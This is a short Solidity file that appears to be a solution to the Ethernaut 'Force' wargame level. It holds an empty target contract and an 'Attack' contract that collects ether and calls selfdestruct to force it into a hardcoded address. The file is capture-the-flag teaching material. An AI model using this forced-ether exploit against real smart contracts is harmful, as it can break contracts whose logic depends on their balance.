//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attack{
    address _addr = 0x03bab5c836D96FC74f756Fbdc24D64F4e2B61E45;

    function kill() external payable {
        selfdestruct(payable(_addr));
    }

    function getEth() public payable returns (bool) {
        return true;
    }
}